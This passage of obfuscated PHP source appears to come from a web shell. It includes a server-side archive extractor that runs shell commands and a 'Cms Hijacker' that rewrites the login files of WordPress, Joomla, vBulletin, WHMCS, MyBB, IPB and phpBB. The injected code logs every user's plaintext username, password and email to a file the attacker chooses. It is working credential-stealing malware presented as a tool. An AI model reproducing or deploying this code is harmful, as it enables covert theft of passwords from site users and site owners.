		foreach($blhbqzcb45b963397aa40d4a0063e0d85e4fe7a1 as $wdyhqgwg8c7dd922ad47494fc02c388e12c00eac){
			$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac=str_replace('\\','/',$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac);
			if(in_array(substr($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac,strrpos($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac,'/')+1),array('.','..')))continue;
			$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac=realpath($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac);
			if(is_dir($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac)===true){
				$zessjrwjadcdbd79a8d84175c229b192aadc02f2->addEmptyDir(str_replace($kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb.'/','',$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac.'/'));
			}else if(is_file($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac)===true){
				$zessjrwjadcdbd79a8d84175c229b192aadc02f2->addFromString(str_replace($kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb.'/','',$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac),file_get_contents($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac));
			}
		}
	}else if(is_file($kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb)===true){
		$zessjrwjadcdbd79a8d84175c229b192aadc02f2->addFromString(basename($kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb),file_get_contents($kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb));
	}
	return $zessjrwjadcdbd79a8d84175c229b192aadc02f2->close();
}
function alfadeziper(){
alfahead();
AlfaNum(8,9,10);
echo '<div class=header><p><center><p><div class="txtfont_header">| DeCompressor |</div></p>
<form onSubmit="g(\'deziper\',null,null,null,this.dirzip.value,this.zipfile.value,\'>>\');return false;" method="post">
<div class="txtfont">File: </div> <input type="text" name="dirzip" value="'.(!empty($_POST['alfa3'])?htmlspecialchars($_POST['alfa3']):htmlspecialchars($GLOBALS['cwd'])).'" size="60"/>
<div class="txtfont">Extract To: </div> <input type="text" name="zipfile" value="'.$GLOBALS['cwd'].'" size="60"/>
<input type="submit" value=" " name="ziper" />
</form></center></p>';
if(isset($_POST['alfa5']) && ($_POST['alfa5'] == '>>')){
$jfeaqldt1c837a6660014f0d862c65f9808fa839 = $_POST['alfa3'];
$csyskoaye11e41bfc3f3cbad6b02bd30f9ab11c6 = $_POST['alfa4'];
if(@!is_dir($csyskoaye11e41bfc3f3cbad6b02bd30f9ab11c6)){
	@mkdir($csyskoaye11e41bfc3f3cbad6b02bd30f9ab11c6, 0777, true);
}
$ibhttvyd0361b5d917ea31386aa0cd1fa4e55bc5 = "";
$epkzkhcb68a7d484a2a1df7457fe2e4e12e936d9 = "";
if(function_exists('finfo_open')){
$ibhttvyd0361b5d917ea31386aa0cd1fa4e55bc5 = @finfo_open(FILEINFO_MIME_TYPE);
$epkzkhcb68a7d484a2a1df7457fe2e4e12e936d9 = @finfo_file($ibhttvyd0361b5d917ea31386aa0cd1fa4e55bc5, $jfeaqldt1c837a6660014f0d862c65f9808fa839);
@finfo_close($ibhttvyd0361b5d917ea31386aa0cd1fa4e55bc5);
}else{
	if($GLOBALS['sys']=='unix'&&_alfa_can_runCommand(true,true)){
		$epkzkhcb68a7d484a2a1df7457fe2e4e12e936d9 = alfaEx('file -b --mime-type ' . $jfeaqldt1c837a6660014f0d862c65f9808fa839);
	}
}
if($GLOBALS['sys']!='unix'&&_alfa_can_runCommand(true,true)){
alfaEx("powershell expand-archive -path '".addslashes($jfeaqldt1c837a6660014f0d862c65f9808fa839)."' -destinationpath '".addslashes(basename($csyskoaye11e41bfc3f3cbad6b02bd30f9ab11c6))."'");
echo __pre().'<center><p>Done -> <b><font color="green">'.$csyskoaye11e41bfc3f3cbad6b02bd30f9ab11c6.'</font></b></p></center>';
}elseif($GLOBALS['sys']=='unix'&&!empty($epkzkhcb68a7d484a2a1df7457fe2e4e12e936d9)&&_alfa_can_runCommand(true,true)&&(strlen(alfaEx('which unzip')) > 0||strlen(alfaEx('which tar')) > 0||strlen(alfaEx('which gunzip')) > 0)){
switch ($epkzkhcb68a7d484a2a1df7457fe2e4e12e936d9) {
	case 'application/zip':
		alfaEx("cd '".addslashes($csyskoaye11e41bfc3f3cbad6b02bd30f9ab11c6)."';unzip '".addslashes($jfeaqldt1c837a6660014f0d862c65f9808fa839)."'");
	break;
	case 'application/x-tar': case 'application/x-gzip': case 'application/x-gtar':
		if(strstr(basename($jfeaqldt1c837a6660014f0d862c65f9808fa839), ".tar.gz")||strstr(basename($jfeaqldt1c837a6660014f0d862c65f9808fa839), ".tar")){
			alfaEx("cd '".addslashes($csyskoaye11e41bfc3f3cbad6b02bd30f9ab11c6)."';tar xzf '".addslashes($jfeaqldt1c837a6660014f0d862c65f9808fa839)."'");
		}else{
			alfaEx("cd '".addslashes($csyskoaye11e41bfc3f3cbad6b02bd30f9ab11c6)."';gunzip '".addslashes($jfeaqldt1c837a6660014f0d862c65f9808fa839)."'");
		}
	break;
}
echo __pre().'<center><p>Done -> <b><font color="green">'.$csyskoaye11e41bfc3f3cbad6b02bd30f9ab11c6.'</font> <a style="cursor:pointer;" onclick="g(\'FilesMan\',\''.$csyskoaye11e41bfc3f3cbad6b02bd30f9ab11c6.'\');">[ View Folder ]</a></b></p></center>';
}elseif(class_exists('ZipArchive')){
	$tedhgotv5848f9360ec5dbfe5a298637fa685438 = false;
	if(emtpy($epkzkhcb68a7d484a2a1df7457fe2e4e12e936d9)){
		$epkzkhcb68a7d484a2a1df7457fe2e4e12e936d9 = "application/zip";
	}
	switch ($epkzkhcb68a7d484a2a1df7457fe2e4e12e936d9) {
		case 'application/zip':
			$zessjrwjadcdbd79a8d84175c229b192aadc02f2 = new ZipArchive;
			$ybaqpbzt9b207167e5381c47682c6b4f58a623fb = $zessjrwjadcdbd79a8d84175c229b192aadc02f2->open($jfeaqldt1c837a6660014f0d862c65f9808fa839);
			if ($ybaqpbzt9b207167e5381c47682c6b4f58a623fb) {
				$zessjrwjadcdbd79a8d84175c229b192aadc02f2->extractTo($csyskoaye11e41bfc3f3cbad6b02bd30f9ab11c6);
				$zessjrwjadcdbd79a8d84175c229b192aadc02f2->close();
				$tedhgotv5848f9360ec5dbfe5a298637fa685438 = true;
			}
		break;
		case 'application/x-tar': case 'application/x-gzip': case 'application/x-gtar':
			if(strstr(basename($jfeaqldt1c837a6660014f0d862c65f9808fa839), ".tar.gz")){
				$wohvjslj25fa8325e4e0eb8180445e42558e60bd = $csyskoaye11e41bfc3f3cbad6b02bd30f9ab11c6 .'/'. basename($jfeaqldt1c837a6660014f0d862c65f9808fa839);
				@copy($jfeaqldt1c837a6660014f0d862c65f9808fa839, $wohvjslj25fa8325e4e0eb8180445e42558e60bd);
				$rqzvyajra96c1a17513b2b220f4e849d603c20db = str_replace(".tar.gz", ".tar", $wohvjslj25fa8325e4e0eb8180445e42558e60bd);
				try {
					$fxuvmwpb83878c91171338902e0fe0fb97a8c47a = new PharData($wohvjslj25fa8325e4e0eb8180445e42558e60bd);
					$fxuvmwpb83878c91171338902e0fe0fb97a8c47a->decompress();
					$vrrwjjzwd7f4be9d064bac5fd42207b3d7efe102 = new PharData($rqzvyajra96c1a17513b2b220f4e849d603c20db);
					$vrrwjjzwd7f4be9d064bac5fd42207b3d7efe102->extractTo($csyskoaye11e41bfc3f3cbad6b02bd30f9ab11c6);
					@unlink($wohvjslj25fa8325e4e0eb8180445e42558e60bd);
					@unlink($rqzvyajra96c1a17513b2b220f4e849d603c20db);
					$tedhgotv5848f9360ec5dbfe5a298637fa685438 = true;
				} catch (Exception $qxcuilgde1671797c52e15f763380b45e841ec32) {
				}
			}else{
				try {
					$vrrwjjzwd7f4be9d064bac5fd42207b3d7efe102 = new PharData($jfeaqldt1c837a6660014f0d862c65f9808fa839);
					$vrrwjjzwd7f4be9d064bac5fd42207b3d7efe102->extractTo($csyskoaye11e41bfc3f3cbad6b02bd30f9ab11c6);
					$tedhgotv5848f9360ec5dbfe5a298637fa685438 = true;
				} catch (Exception $qxcuilgde1671797c52e15f763380b45e841ec32) {
				}
			}
		break;
	}
if($tedhgotv5848f9360ec5dbfe5a298637fa685438){
echo __pre().'<center><p><font color="green">Success...!<br>'.$csyskoaye11e41bfc3f3cbad6b02bd30f9ab11c6.'</font> <a style="cursor:pointer;" onclick="g(\'FilesMan\',\''.$csyskoaye11e41bfc3f3cbad6b02bd30f9ab11c6.'\');">[ View Folder ]</a></p></center>';
}else{echo __pre().'<center><p><font color="red">ERROR!!!...</font></p></center>';}
}
}
echo '</div>';
alfafooter();
}
function alfacmshijacker(){
alfahead();
AlfaNum(5,6,7,8,9,10);
echo '<div class=header><br>
<center><div class="txtfont_header">| Cms Hijacker |</div><br><br><form onSubmit="g(\'cmshijacker\',null,this.cmshi.value,this.saveto.value,\'>>\',this.cmspath.value);return false;" method=\'post\'>
<div class="txtfont">CMS: <select style="width:100px;" name="cmshi">';
$dbaqodsdf0a8d484466c281c1a9087b40aacc270 = array("vb"=>"vBulletin","wp"=>"wordpress","jom"=>"joomla","whmcs"=>"whmcs","mybb"=>"mybb","ipb"=>"ipboard","phpbb"=>"phpbb");
foreach($dbaqodsdf0a8d484466c281c1a9087b40aacc270 as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d=>$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf)echo '<option value="'.$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d.'">'.$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf.'</option>';
echo("</select>");
echo ' Path installed cms: <input size="50" type="text" name="cmspath" placeholder="ex: /home/user/public_html/vbulletin/">
SaveTo: <input size="50" type="text" name="saveto" value="'.$GLOBALS['cwd'].'alfa.txt"></font>
<input type="submit" name="btn" value=" "></form></center><br>';
$enqiaukc570d99e4c85914470d914170d1e95144 = $_POST['alfa1'];
$wgcxhsoqac72b865603145ad0871f59f6d06a776 = $_POST['alfa2'];
$pgtimdyod8c6e4d68ae4c7e615fe67ed7249e910 = $_POST['alfa4'];
if(!empty($enqiaukc570d99e4c85914470d914170d1e95144) AND !empty($wgcxhsoqac72b865603145ad0871f59f6d06a776) AND $_POST['alfa4'] AND $_POST['alfa3'] == '>>'){
echo __pre();
alfaHijackCms($enqiaukc570d99e4c85914470d914170d1e95144,$pgtimdyod8c6e4d68ae4c7e615fe67ed7249e910,$wgcxhsoqac72b865603145ad0871f59f6d06a776);
}
echo '</div>';
alfafooter();
}
function alfaHijackCms($enqiaukc570d99e4c85914470d914170d1e95144,$pgtimdyod8c6e4d68ae4c7e615fe67ed7249e910,$wgcxhsoqac72b865603145ad0871f59f6d06a776){
switch($enqiaukc570d99e4c85914470d914170d1e95144){
case "vb":
hijackvBulletin($pgtimdyod8c6e4d68ae4c7e615fe67ed7249e910,$wgcxhsoqac72b865603145ad0871f59f6d06a776);
break;
case "wp":
hijackwp($pgtimdyod8c6e4d68ae4c7e615fe67ed7249e910,$wgcxhsoqac72b865603145ad0871f59f6d06a776);
break;
case "jom":
hijackJoomla($pgtimdyod8c6e4d68ae4c7e615fe67ed7249e910,$wgcxhsoqac72b865603145ad0871f59f6d06a776);
break;
case "whmcs":
hijackWhmcs($pgtimdyod8c6e4d68ae4c7e615fe67ed7249e910,$wgcxhsoqac72b865603145ad0871f59f6d06a776);
break;
case "mybb":
hijackMybb($pgtimdyod8c6e4d68ae4c7e615fe67ed7249e910,$wgcxhsoqac72b865603145ad0871f59f6d06a776);
break;
case "ipb":
hijackIPB($pgtimdyod8c6e4d68ae4c7e615fe67ed7249e910,$wgcxhsoqac72b865603145ad0871f59f6d06a776);
break;
case "phpbb":
hijackPHPBB($pgtimdyod8c6e4d68ae4c7e615fe67ed7249e910,$wgcxhsoqac72b865603145ad0871f59f6d06a776);
break;
default:
echo "error!";
break;
}
}
function hijackvBulletin($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485,$wgcxhsoqac72b865603145ad0871f59f6d06a776){
$nndigmblc13367945d5d4c91047b3b50234aa7ab='$alfa_username = strtolower($vbulletin->GPC["vb_login_username"]);$alfa_password = $vbulletin->GPC["vb_login_password"];$alfa_file = "{saveto_path}";$sql_query = $vbulletin->db->query_read("SELECT * FROM " . TABLE_PREFIX . "user WHERE `username`=\'" . $alfa_username . "\'");while($row = $vbulletin->db->fetch_array($sql_query)){if(strlen($alfa_password) > 1 AND strlen($alfa_username) > 1){$fp1 = @fopen($alfa_file, "a+");@fwrite($fp1, $alfa_username . \' : \' .  $alfa_password." (" . $row["email"] . ")\n");@fclose($fp1); $f = @file($alfa_file);$new = array_unique($f);$fp = @fopen($alfa_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);}}';
$jigizpteada59f5126d6709496897d33144a62e0 = 'defined(\'DISABLE_PASSWORD_CLEARING\')';
$nndigmblc13367945d5d4c91047b3b50234aa7ab=str_replace('{saveto_path}',$wgcxhsoqac72b865603145ad0871f59f6d06a776,$nndigmblc13367945d5d4c91047b3b50234aa7ab);
$predzshad56b699830e77ba53855679cb1d252da = $jwzcflrpd6fe1d0be6347b8ef2427fa629c04485."/login.php";
$xidctbyra2f2ed4f8ebc2cbb4c21a29dc40ab61d = $jwzcflrpd6fe1d0be6347b8ef2427fa629c04485."/includes/class_bootstrap.php";
$boirntxp747a0737575ae07334599cdae8412534 = 'do_login_redirect();';
$uwdiozugf5a48ef92b35de034fdf7ff052412fbb = "\t".$nndigmblc13367945d5d4c91047b3b50234aa7ab."\n\t".$boirntxp747a0737575ae07334599cdae8412534;
$wvpogbijfb8310058f26e344588c6b8a4a287710 = "true";
if((@is_file($predzshad56b699830e77ba53855679cb1d252da) AND @is_writable($predzshad56b699830e77ba53855679cb1d252da)) || (@is_file($xidctbyra2f2ed4f8ebc2cbb4c21a29dc40ab61d) AND @is_writable($xidctbyra2f2ed4f8ebc2cbb4c21a29dc40ab61d))){
$pylqbhytf29de8859fa34b6b370a904615dfd949 = @file_get_contents($predzshad56b699830e77ba53855679cb1d252da);
$jbantpyi9ce976eb3576451968898a758a7783bf = @file_get_contents($xidctbyra2f2ed4f8ebc2cbb4c21a29dc40ab61d);
if(strstr($pylqbhytf29de8859fa34b6b370a904615dfd949, $boirntxp747a0737575ae07334599cdae8412534) || strstr($jbantpyi9ce976eb3576451968898a758a7783bf, $jigizpteada59f5126d6709496897d33144a62e0)){
$arcxbuvs5646bf90053257c69df1a3ccdb5a549e = str_replace($boirntxp747a0737575ae07334599cdae8412534,$uwdiozugf5a48ef92b35de034fdf7ff052412fbb, $pylqbhytf29de8859fa34b6b370a904615dfd949);
$dfupzguc2b69dbca3e0042b6ea38049da08753ca = str_replace($jigizpteada59f5126d6709496897d33144a62e0,$wvpogbijfb8310058f26e344588c6b8a4a287710, $jbantpyi9ce976eb3576451968898a758a7783bf);
@file_put_contents($predzshad56b699830e77ba53855679cb1d252da, $arcxbuvs5646bf90053257c69df1a3ccdb5a549e);
@file_put_contents($xidctbyra2f2ed4f8ebc2cbb4c21a29dc40ab61d, $dfupzguc2b69dbca3e0042b6ea38049da08753ca);
hijackOutput(0,$wgcxhsoqac72b865603145ad0871f59f6d06a776);
}else{
hijackOutput(1);
}
}else{
hijackOutput(1);
}
}
function hijackwp($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485,$wgcxhsoqac72b865603145ad0871f59f6d06a776){
$nndigmblc13367945d5d4c91047b3b50234aa7ab = '$alfa_file="{saveto_path}";$fp = fopen($alfa_file, "a+");fwrite($fp, $_POST[\'log\']." : ".$_POST[\'pwd\']." (".($user->user_email).")\n");fclose($fp);$f = @file($alfa_file);$new = array_unique($f);$fp = @fopen($alfa_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);';
$vhypaymu6234be57b1b43c4e1acafb5345617be1 = '#if[ ]{0,}\([ ]{0,}![ ]{0,}is_wp_error\([ ]{0,}\$user[ ]{0,}\)[ ]{0,}&&[ ]{0,}![ ]{0,}\$reauth[ ]{0,}\)[ ]{0,}{#';
$nndigmblc13367945d5d4c91047b3b50234aa7ab=str_replace('{saveto_path}',$wgcxhsoqac72b865603145ad0871f59f6d06a776,$nndigmblc13367945d5d4c91047b3b50234aa7ab);
$predzshad56b699830e77ba53855679cb1d252da=$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485."/wp-login.php";
if(@is_file($predzshad56b699830e77ba53855679cb1d252da) AND @is_writable($predzshad56b699830e77ba53855679cb1d252da)){
$pylqbhytf29de8859fa34b6b370a904615dfd949 = @file_get_contents($predzshad56b699830e77ba53855679cb1d252da);
if(@preg_match($vhypaymu6234be57b1b43c4e1acafb5345617be1, $pylqbhytf29de8859fa34b6b370a904615dfd949, $ppwzlnqze3cc92c14a5e6dd1a7d94b6ff634d7fc)){
$uwdiozugf5a48ef92b35de034fdf7ff052412fbb = "\t".$ppwzlnqze3cc92c14a5e6dd1a7d94b6ff634d7fc[0]."\n\t".$nndigmblc13367945d5d4c91047b3b50234aa7ab;
$arcxbuvs5646bf90053257c69df1a3ccdb5a549e = @preg_replace($vhypaymu6234be57b1b43c4e1acafb5345617be1,$uwdiozugf5a48ef92b35de034fdf7ff052412fbb, $pylqbhytf29de8859fa34b6b370a904615dfd949);
@file_put_contents($predzshad56b699830e77ba53855679cb1d252da, $arcxbuvs5646bf90053257c69df1a3ccdb5a549e);
hijackOutput(0,$wgcxhsoqac72b865603145ad0871f59f6d06a776);
}else{
hijackOutput(1);
}
}else{
hijackOutput(1);
}
}
function hijackJoomla($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485,$wgcxhsoqac72b865603145ad0871f59f6d06a776){
$nndigmblc13367945d5d4c91047b3b50234aa7ab = '<?php jimport(\'joomla.user.authentication\');$Alfa_auth = & JAuthentication::getInstance();$Alfa_data = array(\'username\'=>$_POST[\'username\'],\'password\'=>$_POST[\'passwd\']);$Alfa_options = array();$Alfa_response = $Alfa_auth->authenticate($Alfa_data, $Alfa_options);if($Alfa_response->status == 1){$alfa_file="{saveto_path}";$fp=@fopen($alfa_file,"a+");@fwrite($fp, $Alfa_response->username.":".$_POST[\'passwd\']." ( ".$Alfa_response->email." )\n");@fclose($fp);$f = @file($alfa_file);$new = array_unique($f);$fp = @fopen($alfa_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);}?>';
$nndigmblc13367945d5d4c91047b3b50234aa7ab=str_replace('{saveto_path}',$wgcxhsoqac72b865603145ad0871f59f6d06a776,$nndigmblc13367945d5d4c91047b3b50234aa7ab);
$deinbilp005480c8a6a0357d17cff2e8eb7e060d=$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485."/administrator/components/com_login/";
if(@is_file($deinbilp005480c8a6a0357d17cff2e8eb7e060d."/login.php")){
$predzshad56b699830e77ba53855679cb1d252da = $deinbilp005480c8a6a0357d17cff2e8eb7e060d."/login.php";
}elseif(@is_file($deinbilp005480c8a6a0357d17cff2e8eb7e060d."/admin.login.php")){
$predzshad56b699830e77ba53855679cb1d252da = $deinbilp005480c8a6a0357d17cff2e8eb7e060d."/admin.login.php";
}else{
$predzshad56b699830e77ba53855679cb1d252da = '';
}
if(@is_file($predzshad56b699830e77ba53855679cb1d252da) AND @is_writable($predzshad56b699830e77ba53855679cb1d252da) AND $predzshad56b699830e77ba53855679cb1d252da != ''){
$pylqbhytf29de8859fa34b6b370a904615dfd949 = @file_get_contents($predzshad56b699830e77ba53855679cb1d252da);
$uwdiozugf5a48ef92b35de034fdf7ff052412fbb = $nndigmblc13367945d5d4c91047b3b50234aa7ab."\n".$pylqbhytf29de8859fa34b6b370a904615dfd949;
@file_put_contents($predzshad56b699830e77ba53855679cb1d252da, $uwdiozugf5a48ef92b35de034fdf7ff052412fbb);
hijackOutput(0,$wgcxhsoqac72b865603145ad0871f59f6d06a776);
}else{
hijackOutput(1);
}
}
function hijackWhmcs($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485,$wgcxhsoqac72b865603145ad0871f59f6d06a776){
$nndigmblc13367945d5d4c91047b3b50234aa7ab = '<?php if(isset($_POST[\'username\']) AND isset($_POST[\'password\']) AND !empty($_POST[\'username\']) AND !empty($_POST[\'password\'])){if($alfa_connect=@mysqli_connect($db_host,$db_username,$db_password,$db_name)){$alfa_file = "{saveto_path}";$alfa_uname = @$_POST[\'username\'];$alfa_pw = @$_POST[\'password\'];if(isset($_POST[\'language\'])){$alfa_q = "SELECT * FROM tbladmins WHERE `username` = \'$alfa_uname\' AND `password` = \'".md5($alfa_pw)."\'";$admin = true;}else{$alfa_q = "SELECT * FROM tblclients WHERE `email` = \'$alfa_uname\'";$admin = false;}$alfa_query = mysqli_query($alfa_connect, $alfa_q);if(mysqli_num_rows($alfa_query) > 0 ){$row = mysqli_fetch_array($alfa_query);$allow = true;if(!$admin){$__salt = explode(\':\', $row[\'password\']);$__encPW = md5($__salt[1].$_POST[\'password\']).\':\'.$__salt[1];if($row[\'password\'] == $__encPW){$allow = true;$row[\'username\'] = $row[\'email\'];}else{$allow = false;}}if($allow){$fp = @fopen($alfa_file, "a+");@fwrite($fp, $row[\'username\'] . \' : \' .  $alfa_pw." (" . $row["email"] . ") : ".($admin ? \'is_admin\' : \'is_user\')."\n");@fclose($fp);$f = @file($alfa_file);$new = array_unique($f);$fp = @fopen($alfa_file, "w");foreach($new as $values){@fwrite($fp, $values);}@fclose($fp);}}}}?>';
$nndigmblc13367945d5d4c91047b3b50234aa7ab=str_replace('{saveto_path}',$wgcxhsoqac72b865603145ad0871f59f6d06a776,$nndigmblc13367945d5d4c91047b3b50234aa7ab);
$evugkozj3a8e4c06e471595f6eb262bb9b5582d9=$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485."/configuration.php";
if(@is_file($evugkozj3a8e4c06e471595f6eb262bb9b5582d9) AND @is_writable($evugkozj3a8e4c06e471595f6eb262bb9b5582d9)){
$nvkkuaxh7f224eabb16b0fbd15c7dd7b8da65d26 = @file_get_contents($evugkozj3a8e4c06e471595f6eb262bb9b5582d9);
if(!strstr($nvkkuaxh7f224eabb16b0fbd15c7dd7b8da65d26,'?>'))$nndigmblc13367945d5d4c91047b3b50234aa7ab = '?>'.$nndigmblc13367945d5d4c91047b3b50234aa7ab;
$jrxlehha3f2cd132c83b89b33f485e035b5bff84 = $nvkkuaxh7f224eabb16b0fbd15c7dd7b8da65d26."\n".$nndigmblc13367945d5d4c91047b3b50234aa7ab;
@file_put_contents($evugkozj3a8e4c06e471595f6eb262bb9b5582d9, $jrxlehha3f2cd132c83b89b33f485e035b5bff84);
hijackOutput(0,$wgcxhsoqac72b865603145ad0871f59f6d06a776);
}else{
hijackOutput(1);
}
}
function hijackMybb($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485,$wgcxhsoqac72b865603145ad0871f59f6d06a776){
$nndigmblc13367945d5d4c91047b3b50234aa7ab = '$alfa_q = $db->query("SELECT `email` FROM ".TABLE_PREFIX."users WHERE `username` = \'".$user[\'username\']."\'");$alfa_fetch = $db->fetch_array($alfa_q);$alfa_file = "{saveto_path}";$fp = @fopen($alfa_file, "a+");@fwrite($fp, $user[\'username\']." : ". $user[\'password\']." ( ".$alfa_fetch[\'email\']." )\n");@fclose($fp);$f = @file($alfa_file);$new = array_unique($f);$fp = @fopen($alfa_file, "w");foreach($new as $values){@fwrite($fp, $values);}@fclose($fp);';
$tpwrlifnea170e2cafb1337755c8b3d5ae4437f4 = '$loginhandler->complete_login();';
$nndigmblc13367945d5d4c91047b3b50234aa7ab=str_replace('{saveto_path}',$wgcxhsoqac72b865603145ad0871f59f6d06a776,$nndigmblc13367945d5d4c91047b3b50234aa7ab);
$predzshad56b699830e77ba53855679cb1d252da=$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485."/member.php";
$uwdiozugf5a48ef92b35de034fdf7ff052412fbb = "\t".$nndigmblc13367945d5d4c91047b3b50234aa7ab."\n\t".$tpwrlifnea170e2cafb1337755c8b3d5ae4437f4;
if(@is_file($predzshad56b699830e77ba53855679cb1d252da) AND @is_writable($predzshad56b699830e77ba53855679cb1d252da)){
$pylqbhytf29de8859fa34b6b370a904615dfd949 = @file_get_contents($predzshad56b699830e77ba53855679cb1d252da);
if(strstr($pylqbhytf29de8859fa34b6b370a904615dfd949, $tpwrlifnea170e2cafb1337755c8b3d5ae4437f4)){
$arcxbuvs5646bf90053257c69df1a3ccdb5a549e = str_replace($tpwrlifnea170e2cafb1337755c8b3d5ae4437f4,$uwdiozugf5a48ef92b35de034fdf7ff052412fbb, $pylqbhytf29de8859fa34b6b370a904615dfd949);
@file_put_contents($predzshad56b699830e77ba53855679cb1d252da, $arcxbuvs5646bf90053257c69df1a3ccdb5a549e);
hijackOutput(0,$wgcxhsoqac72b865603145ad0871f59f6d06a776);
}else{
hijackOutput(1);
}
}else{
hijackOutput(1);
}
}
function hijackIPB($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485,$wgcxhsoqac72b865603145ad0871f59f6d06a776){
$nndigmblc13367945d5d4c91047b3b50234aa7ab = '$Alfa_q = $this->DB->buildAndFetch(array(\'select\' => \'email\', \'from\' => \'members\', \'where\' => \'name="\'.$username.\'" OR email="\'.$email.\'"\'));$Alfa_file = "{saveto_path}";$fp = @fopen($Alfa_file, "a+");@fwrite($fp, $_POST[\'ips_username\'].\' : \'.$_POST[\'ips_password\'].\' ( \'.$Alfa_q[\'email\'].\' )\'."\n");@fclose($fp);$f = @file($Alfa_file);$new = array_unique($f);$fp = @fopen($Alfa_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);';
$tpwrlifnea170e2cafb1337755c8b3d5ae4437f4 = 'unset( $member[\'plainPassword\'] );';
$nndigmblc13367945d5d4c91047b3b50234aa7ab=str_replace('{saveto_path}',$wgcxhsoqac72b865603145ad0871f59f6d06a776,$nndigmblc13367945d5d4c91047b3b50234aa7ab);
$predzshad56b699830e77ba53855679cb1d252da=$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485."/admin/sources/handlers/han_login.php";
$uwdiozugf5a48ef92b35de034fdf7ff052412fbb = "\t".$tpwrlifnea170e2cafb1337755c8b3d5ae4437f4."\n\t".$nndigmblc13367945d5d4c91047b3b50234aa7ab;
if(@is_file($predzshad56b699830e77ba53855679cb1d252da) AND @is_writable($predzshad56b699830e77ba53855679cb1d252da)){
$pylqbhytf29de8859fa34b6b370a904615dfd949 = @file_get_contents($predzshad56b699830e77ba53855679cb1d252da);
if(strstr($pylqbhytf29de8859fa34b6b370a904615dfd949, $tpwrlifnea170e2cafb1337755c8b3d5ae4437f4)){
$arcxbuvs5646bf90053257c69df1a3ccdb5a549e = str_replace($tpwrlifnea170e2cafb1337755c8b3d5ae4437f4,$uwdiozugf5a48ef92b35de034fdf7ff052412fbb, $pylqbhytf29de8859fa34b6b370a904615dfd949);
@file_put_contents($predzshad56b699830e77ba53855679cb1d252da, $arcxbuvs5646bf90053257c69df1a3ccdb5a549e);
hijackOutput(0,$wgcxhsoqac72b865603145ad0871f59f6d06a776);
}else{
hijackOutput(1);
}
}else{
hijackOutput(1);
}
}
function hijackPHPBB($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485,$wgcxhsoqac72b865603145ad0871f59f6d06a776){
$nndigmblc13367945d5d4c91047b3b50234aa7ab = '$Alfa_u = request_var(\'username\', \'\');$Alfa_p = request_var(\'password\', \'\');if($Alfa_u != \'\' AND $Alfa_p != \'\'){$Alfa_response = $auth->login($Alfa_u,$Alfa_p);if($Alfa_response[\'status\'] == LOGIN_SUCCESS){$Alfa_file ="{saveto_path}";$fp = @fopen($Alfa_file, "a+");@fwrite($fp, $Alfa_u." : ".$Alfa_p. " ( ".$Alfa_response[\'user_row\'][\'user_email\']." )\n");@fclose($fp);$f = @file($Alfa_file);$new = array_unique($f);$fp = @fopen($Alfa_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);}}';
$tpwrlifnea170e2cafb1337755c8b3d5ae4437f4 = 'case \'login\':';
$nndigmblc13367945d5d4c91047b3b50234aa7ab=str_replace('{saveto_path}',$wgcxhsoqac72b865603145ad0871f59f6d06a776,$nndigmblc13367945d5d4c91047b3b50234aa7ab);
$predzshad56b699830e77ba53855679cb1d252da=$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485."/ucp.php";
$uwdiozugf5a48ef92b35de034fdf7ff052412fbb = "\t".$tpwrlifnea170e2cafb1337755c8b3d5ae4437f4."\n\t".$nndigmblc13367945d5d4c91047b3b50234aa7ab;
if(@is_file($predzshad56b699830e77ba53855679cb1d252da) AND @is_writable($predzshad56b699830e77ba53855679cb1d252da)){
$pylqbhytf29de8859fa34b6b370a904615dfd949 = @file_get_contents($predzshad56b699830e77ba53855679cb1d252da);
if(strstr($pylqbhytf29de8859fa34b6b370a904615dfd949, $tpwrlifnea170e2cafb1337755c8b3d5ae4437f4)){
$arcxbuvs5646bf90053257c69df1a3ccdb5a549e = str_replace($tpwrlifnea170e2cafb1337755c8b3d5ae4437f4,$uwdiozugf5a48ef92b35de034fdf7ff052412fbb, $pylqbhytf29de8859fa34b6b370a904615dfd949);
@file_put_contents($predzshad56b699830e77ba53855679cb1d252da, $arcxbuvs5646bf90053257c69df1a3ccdb5a549e);
hijackOutput(0,$wgcxhsoqac72b865603145ad0871f59f6d06a776);
}else{
hijackOutput(1);
}
}else{
hijackOutput(1);
}
}
